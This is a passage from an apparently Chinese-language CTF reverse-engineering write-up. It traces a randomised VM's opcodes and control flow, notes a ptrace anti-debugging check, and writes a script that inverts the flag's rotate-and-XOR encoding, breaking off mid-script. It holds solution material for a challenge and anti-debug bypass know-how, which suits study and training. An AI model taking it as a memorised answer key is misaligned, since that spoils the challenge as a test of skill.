class="hljs-number">0x3058</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x6a77</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x5927</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x64d3</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x6233</span>: ([<span class="hljs-number">0x340a</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x1a4c</span>], <span class="hljs-string">&quot;  --r0;&quot;</span>),<br><span class="hljs-number">0x3cbc</span>: ([<span class="hljs-number">0x7375</span>, <span class="hljs-number">0x5754</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x3cbc</span>, <span class="hljs-number">0x241a</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x1470</span>, <span class="hljs-number">0x55a9</span>], <span class="hljs-string">&quot;  --r0;&quot;</span>),<br><span class="hljs-number">0x1470</span>: ([<span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x41aa</span>, <span class="hljs-number">0x2771</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x188f</span>], <span class="hljs-string">&quot;  --r0;&quot;</span>),<br><span class="hljs-number">0x153a</span>: ([<span class="hljs-number">0x3a4b</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x4d52</span>, <span class="hljs-number">0x41aa</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x2182</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x3a4b</span>: ([<span class="hljs-number">0x4c8c</span>, <span class="hljs-number">0x6bc8</span>, <span class="hljs-number">0x284a</span>, <span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x4d52</span>, <span class="hljs-number">0x6a77</span>, <span class="hljs-number">0x2f84</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x4c8c</span>: ([<span class="hljs-number">0x340a</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x1ee8</span>, <span class="hljs-number">0x1ee8</span>, <span class="hljs-number">0x3a4b</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x2bdd</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x7541</span>, <span class="hljs-number">0x41aa</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x2bdd</span>: ([<span class="hljs-number">0x78f1</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x136e</span>, <span class="hljs-number">0x284a</span>, <span class="hljs-number">0x724c</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x3058</span>], <span class="hljs-string">&quot;  --array[r0];&quot;</span>),<br><span class="hljs-number">0x7541</span>: ([<span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x2b07</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x51ff</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x4d52</span>: ([<span class="hljs-number">0x7375</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x25b1</span>, <span class="hljs-number">0x64d3</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x7375</span>], <span class="hljs-string">&quot;  ++r1;&quot;</span>),<br><span class="hljs-number">0x7809</span>: ([<span class="hljs-number">0x5002</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x4d52</span>, <span class="hljs-number">0x241a</span>, <span class="hljs-number">0x1e22</span>, <span class="hljs-number">0x3cbc</span>, <span class="hljs-number">0x1e22</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x5d6d</span>], <span class="hljs-string">&quot;  --r0;&quot;</span>),<br><span class="hljs-number">0x5baf</span>: ([<span class="hljs-number">0x3058</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x5754</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x241a</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x5833</span>, <span class="hljs-number">0x2425</span>], <span class="hljs-string">&quot;  array[r0] = *((_BYTE *)&amp;flag + (unsigned __int8)r1);&quot;</span>),<br><span class="hljs-number">0x5833</span>: ([<span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x2771</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x7375</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x11c9</span>: ([<span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x241a</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x1fb5</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x5103</span>: ([<span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x5927</span>, <span class="hljs-number">0x64d3</span>, <span class="hljs-number">0x25b1</span>, <span class="hljs-number">0x2771</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x5f5c</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x54ca</span>: ([<span class="hljs-number">0x209a</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x724c</span>, <span class="hljs-number">0x5baf</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x2bdd</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x3bf0</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x68a6</span>: ([<span class="hljs-number">0x3565</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x3308</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x1bf1</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x4b0f</span>: ([<span class="hljs-number">0x2917</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x3137</span>, <span class="hljs-number">0x5baf</span>, <span class="hljs-number">0x2bdd</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x2771</span>, <span class="hljs-number">0x136e</span>, <span class="hljs-number">0x5754</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));&quot;</span>),<br><span class="hljs-number">0x3fd4</span>: ([<span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x6a77</span>, <span class="hljs-number">0x17be</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x64d3</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>虚拟机指令有下面几种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">array[r0] = 0</span><br><span class="hljs-string">array[r0] += 1</span><br><span class="hljs-string">array[r0] -= 1</span><br><span class="hljs-string">r0 += 1</span><br><span class="hljs-string">r0 -= 1</span><br><span class="hljs-string">r1 += 1</span><br><span class="hljs-string">r1 -= 1</span><br><span class="hljs-string">flag[r1] = (flag[r1] &gt;&gt; array[r0]) | (flag[r1] &lt;&lt; (8 - array[r0]))</span><br><span class="hljs-string">array[r0] = syscall(array[r0], array[r0+1], &amp;array[r0+2], array[r0+3])</span><br><span class="hljs-string">flag[r1] ^= array[r0]</span><br><span class="hljs-string">flag[r1] = array[r0]</span><br><span class="hljs-string">array[r0] = flag[r1]</span><br><span class="hljs-string">if (array[r0] &lt; 0) rand();</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>除了基本的数据处理外，使用syscall实现系统调用，还有if分支根据<code>array[r0]</code>决定是否跳过一个随机数，即控制执行流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">pc = <span class="hljs-number">0x717F</span><br>i = <span class="hljs-number">0</span><br>skips = [<span class="hljs-number">18</span>, <span class="hljs-number">22</span>, <span class="hljs-number">48</span>, <span class="hljs-number">168</span>, <span class="hljs-number">172</span>, <span class="hljs-number">312</span>, <span class="hljs-number">340</span>, <span class="hljs-number">370</span>, <span class="hljs-number">397</span>, <span class="hljs-number">449</span>, <span class="hljs-number">478</span>, <span class="hljs-number">595</span>, <span class="hljs-number">599</span>, <span class="hljs-number">623</span>, <span class="hljs-number">627</span>, <span class="hljs-number">675</span>]<br><span class="hljs-keyword">while</span> (pc != <span class="hljs-number">0x241A</span>):<br>    <span class="hljs-built_in">print</span>(i, <span class="hljs-built_in">hex</span>(pc), ops[pc][<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> skips):<br>        i += <span class="hljs-number">1</span><br>    r = rands[i]<br>    i += <span class="hljs-number">1</span><br>    pc = ops[pc][<span class="hljs-number">0</span>][r]<br></code></pre></td></tr></table></figure><p>根据跑出来的随机数解析一下控制流，类似于下面这种需要手动设置一下skip跳过一个随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">16 0x284a   array[r0] = 0;</span><br><span class="hljs-string">17 0x7717   --array[r0];</span><br><span class="hljs-string">18 0x3565   if ( (char)array[r0] &lt; 0 ) rand();</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>虚拟指令里面用<code>syscall(0)</code>输入1个字符，进行一些移位异或操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">array[0] = 0</span><br><span class="hljs-string">array[1] = 0</span><br><span class="hljs-string">array[3] = 1</span><br><span class="hljs-string">10    array[2] = getchar()</span><br><span class="hljs-string">flag[0] ^= array[2]</span><br><span class="hljs-string">flag[1] = array[2]</span><br><span class="hljs-string">array[2] = 3</span><br><span class="hljs-string">flag[1] = (flag[1] &gt;&gt; 3 | (flag[1] &lt;&lt; 5)</span><br><span class="hljs-string">flag[1] ^= 3</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>还有<code>syscall(101, 0, 0, 0)</code>，即<code>ptrace</code>反调试检测，需要注意在无调试的情况下，第一次调用ptrace返回值为0，if不跳过rand，但是后续继续调用ptrace会返回-1，if需要跳过rand</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">array[4] = 101</span><br><span class="hljs-string">array[5] = 0</span><br><span class="hljs-string">array[6] = 0</span><br><span class="hljs-string">array[7] = 0</span><br><span class="hljs-string">array[8] = 0</span><br><span class="hljs-string">array[4] = syscall(101, 0, 0, 0) # ptrace反调试, 0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>输入完12个字符后，最后还有一段异或操作，人肉解析一下，纯体力活</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">array[0] = 0</span><br><span class="hljs-string">array[1] = 0</span><br><span class="hljs-string">array[3] = 1</span><br><span class="hljs-string">10    array[2] = getchar()</span><br><span class="hljs-string">flag[0] ^= array[2]</span><br><span class="hljs-string">flag[1] = array[2]</span><br><span class="hljs-string">array[2] = 3</span><br><span class="hljs-string">flag[1] = (flag[1] &gt;&gt; 3 | (flag[1] &lt;&lt; 5)</span><br><span class="hljs-string">flag[1] ^= 3</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[2] = 0</span><br><span class="hljs-string">array[3] = 0</span><br><span class="hljs-string">array[5] = 1</span><br><span class="hljs-string">40      array[4] = getchar()</span><br><span class="hljs-string">flag[1] ^= array[4]</span><br><span class="hljs-string">flag[2] = array[4]</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[4] = 101</span><br><span class="hljs-string">array[5] = 0</span><br><span class="hljs-string">array[6] = 0</span><br><span class="hljs-string">array[7] = 0</span><br><span class="hljs-string">array[8] = 0</span><br><span class="hljs-string">array[4] = syscall(101, 0, 0, 0) # ptrace反调试, 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[4] = 5</span><br><span class="hljs-string">flag[2] = (flag[2] &gt;&gt; 5 | (flag[2] &lt;&lt; 3)</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[4] = 0</span><br><span class="hljs-string">array[5] = 0</span><br><span class="hljs-string">array[7] = 1</span><br><span class="hljs-string">191     array[6] = getchar()    # array[4] = 1</span><br><span class="hljs-string">flag[2] ^= array[6]</span><br><span class="hljs-string">flag[3] = array[6]</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[6] = 101</span><br><span class="hljs-string">array[7] = 0</span><br><span class="hljs-string">array[8] = 0</span><br><span class="hljs-string">array[9] = 0</span><br><span class="hljs-string">array[10] = 0</span><br><span class="hljs-string">array[6] = syscall(101, 0, 0, 0) # ptrace反调试, -1</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[6] = 6</span><br><span class="hljs-string">flag[3] = (flag[3] &gt;&gt; 6 | (flag[3] &lt;&lt; 2)</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[6] = 0</span><br><span class="hljs-string">array[7] = 0</span><br><span class="hljs-string">array[9] = 1</span><br><span class="hljs-string">332     array[8] = getchar()    # array[6] = 1</span><br><span class="hljs-string">flag[3] ^= array[8]</span><br><span class="hljs-string">falg[4] = array[8]</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[8] = 7</span><br><span class="hljs-string">flag[4] = (flag[4] &gt;&gt; 7 | (flag[4] &lt;&lt; 1)</span><br><span class="hljs-string">flag[4] ^= 7</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[8] = 0</span><br><span class="hljs-string">arry[9] = 0</span><br><span class="hljs-string">array[11] = 1</span><br><span class="hljs-string">362     array[10] = getchar()   # array[8] = 1</span><br><span class="hljs-string">flag[4] ^= array[10]</span><br><span class="hljs-string">flag[5] = array[10]</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[10] = 4</span><br><span class="hljs-string">flag[5] = (flag[5] &gt;&gt; 4 | (flag[5] &lt;&lt; 4)</span><br><span class="hljs-string">flag[5] ^= 4</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[10] = 0</span><br><span class="hljs-string">array[11] = 0</span><br><span class="hljs-string">array[13] = 1</span><br><span class="hljs-string">389     array[12] = getchar()   # array[10] = 1</span><br><span class="hljs-string">flag[5] ^= array[12]</span><br><span class="hljs-string">flag[6] = array[12]</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[12] = 4</span><br><span class="hljs-string">flag[6] = (flag[6] &gt;&gt; 4 | (flag[6] &lt;&lt; 4)</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[12] = 0</span><br><span class="hljs-string">array[13] = 0</span><br><span class="hljs-string">array[15] = 1</span><br><span class="hljs-string">415     array[14] = getchar()   # array[12] = 1</span><br><span class="hljs-string">flag[6] ^= array[14]</span><br><span class="hljs-string">flag[7] = array[14]</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[14] = 7</span><br><span class="hljs-string">flag[7] = (flag[7] &gt;&gt; 7 | (flag[7] &lt;&lt; 1)</span><br><span class="hljs-string">flag[7] ^= 7</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[14] = 0</span><br><span class="hljs-string">array[15] = 0</span><br><span class="hljs-string">array[17] = 1</span><br><span class="hljs-string">441     array[16] = getchar()   # array[14] = 1</span><br><span class="hljs-string">flag[7] ^= array[16]</span><br><span class="hljs-string">flag[8] = array[16]</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[16] = 7</span><br><span class="hljs-string">flag[8] = (flag[8] &gt;&gt; 7 | (flag[8] &lt;&lt; 1)</span><br><span class="hljs-string"></span><br><span class="hljs-string">array[16] = 0</span><br><span class="hljs-string">array[17] = 0</span><br><span class="hljs-string">array[19] = 1</span><br><span class="hljs-string">470    array[18] = getchar()   # array[16] = 1</span><br><span class="hljs-string">flag[8] ^= array[18]</span><br><span class="hljs-string">flag[9] = array[18]</span><br><span class="hljs-string"></span><br><span class="hljs-string">flag[9] = (flag[9] &gt;&gt; 2 | (flag[9] &lt;&lt; 6)</span><br><span class="hljs-string"></span><br><span class="hljs-string">615     c = getchar()</span><br><span class="hljs-string">flag[9] ^= c</span><br><span class="hljs-string">flag[10] = c</span><br><span class="hljs-string"></span><br><span class="hljs-string">flag[10] = (flag[10] &gt;&gt; 4) | (flag[10] &lt;&lt; 4)</span><br><span class="hljs-string"></span><br><span class="hljs-string">645     c = getchar()</span><br><span class="hljs-string">flag[10] ^= c</span><br><span class="hljs-string">flag[11] = c</span><br><span class="hljs-string"></span><br><span class="hljs-string">flag[11] = (flag[11] &gt;&gt; 4) | (flag[11] &lt;&lt; 4)</span><br><span class="hljs-string"></span><br><span class="hljs-string">667     c = getchar()</span><br><span class="hljs-string">flag[11] ^= c</span><br><span class="hljs-string">flag[12] = c</span><br><span class="hljs-string"></span><br><span class="hljs-string">flag[12] = (flag[12] &gt;&gt; 7) | (flag[12] &lt;&lt; 1)</span><br><span class="hljs-string">flag[12] ^= 7</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">flag[2] ^= flag[1]</span><br><span class="hljs-string">.</span><br><span class="hljs-string">.</span><br><span class="hljs-string">.</span><br><span class="hljs-string">flag[12] ^= flag[11]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>逆一下加密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = [<span class="hljs-number">0</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x19</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>    flag[i] ^= flag[i-<span class="hljs-number">1</span>]<br><br>flag[<span class="hljs-number">12</span>] ^= <span class="hljs-number">7</span><br>flag[<span class="hljs-number">12</span>] = (flag[<span class="hljs-number">12</span>] &lt;&lt; <span class="hljs-number">7</span>) | (flag[<span class="hljs-number">12</span>] &gt;&gt; <span class="hljs-number">1</span>)<br>flag[<span class="hljs-number">12</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">11</span>] ^= flag[<span class="hljs-number">12</span>]<br>flag[<span class="hljs-number">11</span>] = (flag[<span class="hljs-number">11</span>] &lt;&lt; <span class="hljs-number">4</span>) | (flag[<span class="hljs-number">11</span>] &gt;&gt; <span class="hljs-number">4</span>)<br>flag[<span class="hljs-number">11</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">10</span>] ^= flag[<span class="hljs-number">11</span>]<br>flag[<span class="hljs-number">10</span>] = (flag[<span class="hljs-number">10</span>] &lt;&lt; <span class="hljs-number">4</span>) | (flag[<span class="hljs-number">10</span>] &gt;&gt; <span class="hljs-number">4</span>)<br>flag[<span class="hljs-number">10</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">9</span>] ^= flag[<span class="hljs-number">10</span>]<br>flag[<span class="hljs-number">9</span>] = (flag[<span class="hljs-number">9</span>] &lt;&lt; <span class="hljs-number">2</span>) | (flag[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">6</span>)<br>flag[<span class="hljs-number">9</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">8</span>] ^= flag[<span class="hljs-number">9</span>]<br>flag[<span class="hljs-number">8</span>] = (flag[<span class="hljs-number">8</span>] &lt;&lt; <span class="hljs-number">7</span>) | (flag[<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">1</span>)<br>flag[<span class="hljs-number">8</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">7</span>] ^= flag[<span class="hljs-number">8</span>]<br>flag[<span class="hljs-number">7</span>] ^= <span class="hljs-number">7</span><br>flag[<span class="hljs-number">7</span>] = (flag[<span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">7</span>) | (flag[<span class="hljs-number">7</span>] &gt;&gt; <span class="hljs-number">1</span>)<br>flag[<span class="hljs-number">7</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">6</span>] ^= flag[<span class="hljs-number">7</span>]<br>flag[<span class="hljs-number">6</span>] = (flag[<span class="hljs-number">6</span>] &lt;&lt; <span class="hljs-number">4</span>) | (flag[<span class="hljs-number">6</span>] &gt;&gt; <span class="hljs-number">4</span>)<br>flag[<span class="hljs-number">6</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">5</span>] ^= flag[<span class="hljs-number">6</span>]<br>flag[<span class="hljs-number">5</span>] ^= <span class="hljs-number">4</span><br>flag[<span class="hljs-number">5</span>] = (flag[<span class="hljs-number">5</span>] &lt;&lt; <span class="hljs-number">4</span>) | (flag[<span class="hljs-number">5</span>] &gt;&gt; <span class="hljs-number">4</span>)<br>flag[<span class="hljs-number">5</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">4</span>] ^= flag[<span class="hljs-number">5</span>]<br>flag[<span class="hljs-number">4</span>] 